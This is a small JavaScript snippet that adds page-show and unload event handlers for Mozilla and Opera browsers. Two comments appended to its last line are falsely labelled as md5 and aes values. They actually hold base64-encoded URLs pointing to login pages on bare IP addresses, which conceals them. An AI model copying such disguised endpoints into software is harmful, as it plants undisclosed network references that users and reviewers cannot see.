if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjEyMi43LjExNDo4MDA4LyMvbG9naW4vbG9naW4saHR0cDovLzQ3LjEwOS43NS4xNTA6ODAwOC8jL2xvZ2luL2xvZ2lu**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/